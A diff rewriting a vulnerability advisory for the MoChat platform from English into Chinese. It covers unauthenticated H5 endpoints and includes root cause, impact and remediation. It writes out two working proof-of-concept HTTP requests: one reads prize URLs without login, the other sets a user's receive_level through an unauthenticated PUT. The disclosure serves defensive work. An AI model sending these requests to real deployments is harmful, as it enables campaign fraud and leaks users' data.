@@ -1,28 +1,26 @@
-# MoChat — 任务宝 H5 接口未鉴权读写 (MC-VULN-006)
+# MoChat 任务宝 H5 未鉴权（MC-VULN-006）
 
-| Field | Value |
-|-------|-------|
-| **Vendor** | mochat-cloud |
-| **Product** | MoChat |
-| **Version** | master（Hyperf 2.2） |
-| **Type** | Missing Authentication for Critical Function |
-| **CWE** | CWE-306 / CWE-639 |
-| **Authentication** | None |
+| 字段 | 内容 |
+|------|------|
+| 厂商 | mochat-cloud |
+| 产品 | MoChat |
+| 版本 | master（Hyperf 2.2） |
+| 类型 | 关键功能缺少认证 |
+| CWE | CWE-306 / CWE-639 |
+| 权限 | 无需登录 |
 
-## Summary
+## 简述
 
-`/operation/workFission/taskData` leaks campaign prizes; `PUT /operation/workFission/receive` updates `receive_level` with empty validation.
+`GET /operation/workFission/taskData` 不带任何登录态也能读到活动奖品链接。  
+`PUT /operation/workFission/receive` 校验规则是空的，随便传 `union_id` + `level` 就能改库里的 `receive_level`。
 
-## Root cause
+根因很简单：Operation 侧那几个 Action 没挂 `@Middleware`，`Receive::rules()` 直接返回 `[]`。
 
-Operation Action classes lack any `@Middleware`; `Receive::rules()` returns `[]`.
+## 复现（Yakit）
 
-## Proof of Concept (Yakit)
+完整请求包见：[`../poc/MC-VULN-006/YAKIT-PoC.md`](../poc/MC-VULN-006/YAKIT-PoC.md)
 
-Full packets: [`../poc/MC-VULN-006-YAKIT-完整请求包.md`](../poc/MC-VULN-006-YAKIT-完整请求包.md)  
-（仓库内亦可看 [`../poc/MC-VULN-006/YAKIT-PoC.md`](../poc/MC-VULN-006/YAKIT-PoC.md)）
-
-### 1) Unauthenticated read — task / prize URL
+### 1. 未登录读奖品
 
 ```http
 GET /operation/workFission/taskData?union_id=union_poc_test&fission_id=1 HTTP/1.1
@@ -33,11 +31,11 @@ Connection: close
 
 ```
 
-**Expected:** `code=200`, `data.task[].gift_url` present
+本地结果：`code=200`，`data.task` 里能看到 `gift_url`。
 
-![PoC-1 taskData](./screenshots/MC-VULN-006-01-taskData.png)
+![taskData](./screenshots/MC-VULN-006-01-taskData.png)
 
-### 2) Unauthenticated write — receive_level
+### 2. 未登录改领取等级
 
 ```http
 PUT /operation/workFission/receive HTTP/1.1
@@ -49,22 +47,22 @@ Connection: close
 {"union_id":"union_poc_test","level":5}
 ```
 
-**Expected:** `{"code":200,...}`；DB `mc_work_fission_contact.receive_level` updated
+返回 `code=200`。再查表 `mc_work_fission_contact`，对应行的 `receive_level` 已经变成 5。
 
-![PoC-2 receive](./screenshots/MC-VULN-006-02-receive.png)
+![receive](./screenshots/MC-VULN-006-02-receive.png)
 
-![PoC-3 DB evidence](./screenshots/MC-VULN-006-03-db-receive-level.png)
+![DB](./screenshots/MC-VULN-006-03-db-receive-level.png)
 
-## Impact
+## 影响
 
-Campaign fraud, PII leak (nicknames/avatars via inviteFriends), prize URL disclosure.
+活动白嫖、领奖链路被改。邀请关系列表接口还会带出昵称头像一类信息（同一套未鉴权 H5）。
 
-## Remediation
+## 修法
 
-H5 session/signed token; validate union_id ownership; server-side level checks.
+H5 接口加上会话或签名校验。`union_id` 必须跟当前会话绑定。等级只能由服务端按任务进度算，别信客户端传的 `level`。
 
-## References
+## 参考
 
-- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-006
-- PoC: `POC_VERIFICATION_REPORT.md`
-- Yakit: `poc/MC-VULN-006-YAKIT-完整请求包.md`
+- 审计：`SECURITY_AUDIT_REPORT.md` §MC-VULN-006  
+- 核实：`POC_VERIFICATION_REPORT.md`  
+- Yakit：`poc/MC-VULN-006/YAKIT-PoC.md`
